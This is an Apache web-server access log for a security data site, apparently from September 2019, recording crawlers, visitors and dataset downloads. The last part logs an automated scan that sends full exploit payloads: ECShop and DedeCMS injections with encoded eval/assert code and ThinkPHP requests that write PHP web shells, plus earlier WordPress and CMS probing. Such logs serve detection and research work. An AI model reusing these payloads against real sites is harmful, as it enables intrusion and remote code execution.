42.236.10.114 - - [22/Sep/2019:06:37:53 -0700] "GET / HTTP/1.1" 301 475 "http://www.baidu.com/" "Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN" 
42.236.10.117 - - [22/Sep/2019:06:37:54 -0700] "GET / HTTP/1.1" 200 12432 "http://www.baidu.com/" "Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN" 
42.236.10.117 - - [22/Sep/2019:06:37:55 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN" 
42.236.10.117 - - [22/Sep/2019:06:37:56 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN" 
42.236.10.117 - - [22/Sep/2019:06:37:56 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN" 
113.171.224.176 - - [22/Sep/2019:06:43:18 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
139.9.185.7 - - [22/Sep/2019:06:49:39 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" 
54.36.148.149 - - [22/Sep/2019:06:55:26 -0700] "GET /self.logs/error.log.2018-05-26.gz HTTP/1.1" 200 5800 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
139.9.217.71 - - [22/Sep/2019:06:57:32 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" 
212.96.232.75 - - [22/Sep/2019:07:01:38 -0700] "GET /wp-login.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
212.96.232.75 - - [22/Sep/2019:07:01:39 -0700] "GET / HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
35.193.14.140 - - [22/Sep/2019:07:10:11 -0700] "GET / HTTP/1.1" 200 12388 "-" "awesome_bot" 
185.136.167.216 - - [22/Sep/2019:07:15:40 -0700] "GET /wordpress/wp-admin/install.php HTTP/1.1" 301 498 "-" "Python-urllib/2.7" 
185.136.167.216 - - [22/Sep/2019:07:15:41 -0700] "GET /wordpress/wp-admin/install.php HTTP/1.1" 404 257 "-" "Python-urllib/2.7" 
59.33.118.154 - - [22/Sep/2019:07:19:59 -0700] "GET / HTTP/1.1" 200 46561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
59.33.118.154 - - [22/Sep/2019:07:20:04 -0700] "GET / HTTP/1.1" 200 46561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
59.33.118.154 - - [22/Sep/2019:07:20:07 -0700] "GET / HTTP/1.1" 200 46561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
59.33.118.154 - - [22/Sep/2019:07:20:09 -0700] "GET / HTTP/1.1" 200 46561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
59.33.118.154 - - [22/Sep/2019:07:20:28 -0700] "GET / HTTP/1.1" 200 46561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
59.33.118.154 - - [22/Sep/2019:07:20:44 -0700] "GET / HTTP/1.1" 200 46561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
59.33.118.154 - - [22/Sep/2019:07:20:45 -0700] "GET / HTTP/1.1" 200 46561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
34.66.25.221 - - [22/Sep/2019:07:21:09 -0700] "GET / HTTP/1.1" 200 12387 "-" "awesome_bot" 
37.228.233.49 - - [22/Sep/2019:07:26:16 -0700] "GET / HTTP/1.1" 200 12431 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
37.228.233.49 - - [22/Sep/2019:07:26:16 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
37.228.233.49 - - [22/Sep/2019:07:26:17 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
37.228.233.49 - - [22/Sep/2019:07:26:17 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
37.228.233.49 - - [22/Sep/2019:07:26:18 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
157.55.39.29 - - [22/Sep/2019:07:26:29 -0700] "GET /robots.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.150.157 - - [22/Sep/2019:07:33:43 -0700] "GET /self.logs/2015/error.log.2015-04-30.gz HTTP/1.1" 200 1162 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
123.30.175.163 - - [22/Sep/2019:07:35:46 -0700] "GET /robots.txt HTTP/1.1" 301 458 "-" "Mozilla/5.0 (compatible; coccocbot-image/1.0; +http://help.coccoc.com/searchengine)" 
123.30.175.163 - - [22/Sep/2019:07:35:48 -0700] "GET /robots.txt HTTP/1.1" 200 251 "-" "Mozilla/5.0 (compatible; coccocbot-image/1.0; +http://help.coccoc.com/searchengine)" 
58.250.125.107 - - [22/Sep/2019:07:38:48 -0700] "GET /robots.txt HTTP/1.1" 301 458 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
58.250.125.107 - - [22/Sep/2019:07:41:42 -0700] "GET / HTTP/1.1" 301 438 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
58.250.125.107 - - [22/Sep/2019:07:41:44 -0700] "GET /robots.txt HTTP/1.1" 200 251 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
54.36.148.69 - - [22/Sep/2019:07:43:42 -0700] "GET /self.logs/2015/error.log.2015-04-23.gz HTTP/1.1" 200 745 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
113.171.224.176 - - [22/Sep/2019:07:46:54 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
58.250.125.107 - - [22/Sep/2019:07:47:22 -0700] "GET / HTTP/1.1" 200 12394 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
209.15.209.89 - - [22/Sep/2019:08:01:33 -0700] "HEAD / HTTP/1.1" 200 273 "-" "-" 
79.33.242.121 - - [22/Sep/2019:08:01:34 -0700] "GET / HTTP/1.1" 200 12432 "https://www.researchgate.net/" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" 
79.33.242.121 - - [22/Sep/2019:08:01:34 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" 
79.33.242.121 - - [22/Sep/2019:08:01:34 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" 
79.33.242.121 - - [22/Sep/2019:08:01:34 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" 
54.36.148.173 - - [22/Sep/2019:08:01:34 -0700] "GET /self.logs/2015/access.log.2015-09-13.gz HTTP/1.1" 200 4298 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
79.33.242.121 - - [22/Sep/2019:08:01:35 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" 
54.36.149.72 - - [22/Sep/2019:08:01:53 -0700] "GET /self.logs/2015/error.log.2015-07-31.gz HTTP/1.1" 200 776 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.238 - - [22/Sep/2019:08:02:40 -0700] "GET /self.logs/error.log.2017-03-31.gz HTTP/1.1" 200 4017 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
124.193.145.45 - - [22/Sep/2019:08:05:39 -0700] "GET /favicon.ico HTTP/1.1" 200 302 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
54.36.148.115 - - [22/Sep/2019:08:07:30 -0700] "GET /self.logs/error.log.2018-10-21.gz HTTP/1.1" 200 5045 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.182 - - [22/Sep/2019:08:21:01 -0700] "GET /self.logs/error.log.2015-10-19.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
185.120.124.8 - - [22/Sep/2019:08:26:08 -0700] "GET /wp-login.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
185.120.124.8 - - [22/Sep/2019:08:26:09 -0700] "GET / HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
123.163.253.6 - - [22/Sep/2019:08:27:57 -0700] "HEAD /tags.php HTTP/1.1" 404 275 "-" "-" 
123.163.253.6 - - [22/Sep/2019:08:27:57 -0700] "HEAD /data/conmmon.inc.php HTTP/1.1" 404 275 "-" "-" 
123.55.234.236 - - [22/Sep/2019:08:27:57 -0700] "HEAD /special/index.php HTTP/1.1" 404 275 "-" "-" 
123.55.234.207 - - [22/Sep/2019:08:27:57 -0700] "HEAD /data/admin/ver.txt HTTP/1.1" 404 275 "-" "-" 
103.46.200.55 - - [22/Sep/2019:08:36:12 -0700] "GET / HTTP/1.1" 200 12432 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
103.46.200.55 - - [22/Sep/2019:08:36:13 -0700] "GET /css/style.css HTTP/1.1" 404 294 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
103.46.200.55 - - [22/Sep/2019:08:36:14 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
103.46.200.55 - - [22/Sep/2019:08:36:23 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 624 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
74.215.107.148 - - [22/Sep/2019:08:36:42 -0700] "GET / HTTP/1.1" 200 12432 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1" 
74.215.107.148 - - [22/Sep/2019:08:36:42 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1" 
74.215.107.148 - - [22/Sep/2019:08:36:42 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1" 
74.215.107.148 - - [22/Sep/2019:08:37:42 -0700] "GET / HTTP/1.1" 200 12432 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1" 
54.36.148.53 - - [22/Sep/2019:08:39:50 -0700] "GET /self.logs/error.log.2016-05-06.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.139 - - [22/Sep/2019:08:41:56 -0700] "GET /self.logs/error.log.2018-07-15.gz HTTP/1.1" 200 13557 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
103.46.200.55 - - [22/Sep/2019:08:36:37 -0700] "GET /pe_static/zeus.zip HTTP/1.1" 200 51367133 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
103.46.200.55 - - [22/Sep/2019:08:42:11 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 6249600 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
103.46.200.55 - - [22/Sep/2019:08:42:10 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 8323200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
103.46.200.55 - - [22/Sep/2019:08:44:43 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 14763165 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
66.249.75.45 - - [22/Sep/2019:08:48:11 -0700] "GET / HTTP/1.1" 200 12431 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
199.58.86.211 - - [22/Sep/2019:08:51:31 -0700] "GET /robots.txt HTTP/1.1" 301 495 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.211 - - [22/Sep/2019:08:51:32 -0700] "GET /robots.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.211 - - [22/Sep/2019:08:51:35 -0700] "GET / HTTP/1.1" 301 419 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.211 - - [22/Sep/2019:08:51:37 -0700] "GET / HTTP/1.1" 200 12387 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
113.171.224.176 - - [22/Sep/2019:08:51:49 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
103.46.200.55 - - [22/Sep/2019:08:55:11 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 358 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
103.46.200.55 - - [22/Sep/2019:08:55:11 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 93600 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
79.97.141.49 - - [22/Sep/2019:08:59:51 -0700] "GET / HTTP/1.1" 200 12431 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
79.97.141.49 - - [22/Sep/2019:08:59:51 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
79.97.141.49 - - [22/Sep/2019:08:59:51 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
79.97.141.49 - - [22/Sep/2019:08:59:51 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
79.97.141.49 - - [22/Sep/2019:08:59:52 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
188.138.102.218 - - [22/Sep/2019:09:01:38 -0700] "GET / HTTP/1.1" 200 12431 "-" "admantx-euaspb/3.1 (+http://www.admantx.com/service-fetcher.html)" 
188.138.75.77 - - [22/Sep/2019:09:01:38 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" 
188.138.75.77 - - [22/Sep/2019:09:01:38 -0700] "GET / HTTP/1.1" 200 12431 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" 
178.156.202.83 - - [22/Sep/2019:09:07:39 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 294 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [22/Sep/2019:09:07:40 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 271 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [22/Sep/2019:09:07:40 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 271 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [22/Sep/2019:09:07:40 -0700] "GET /plus/moon.php HTTP/1.1" 404 271 "http://www.secrepo.com/plus/moon.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [22/Sep/2019:09:07:40 -0700] "POST /plus/90sec.php HTTP/1.1" 404 271 "http://www.secrepo.com/plus/90sec.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [22/Sep/2019:09:07:40 -0700] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 404 271 "http://www.secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [22/Sep/2019:09:07:40 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 404 271 "http://www.secrepo.com/utility/convert/data/config.inc.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [22/Sep/2019:09:07:40 -0700] "GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1" 404 271 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\\%22;eval($_POST[ysy]);die();//" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [22/Sep/2019:09:07:40 -0700] "POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1" 404 271 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [22/Sep/2019:09:07:41 -0700] "POST /index.php/api/Uploadify/preview HTTP/1.1" 404 271 "http://www.secrepo.com/index.php/api/Uploadify/preview" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [22/Sep/2019:09:07:41 -0700] "GET /user.php?act=login HTTP/1.1" 404 271 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:288:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [22/Sep/2019:09:07:41 -0700] "POST /fdgq.php HTTP/1.1" 404 271 "http://www.secrepo.com/fdgq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [22/Sep/2019:09:07:41 -0700] "GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=gvwqx.php&content=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E HTTP/1.1" 200 46582 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=gvwqx.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [22/Sep/2019:09:07:41 -0700] "POST /gvwqx.php HTTP/1.1" 404 271 "http://www.secrepo.com/gvwqx.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [22/Sep/2019:09:07:42 -0700] "GET /user.php?act=login HTTP/1.1" 404 271 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:297:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [22/Sep/2019:09:07:42 -0700] "POST /ysyqq.php HTTP/1.1" 404 271 "http://www.secrepo.com/ysyqq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [22/Sep/2019:09:07:42 -0700] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=yoryp.php&vars%5B1%5D%5B%5D=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E$ HTTP/1.1" 200 46582 "http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=yoryp.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
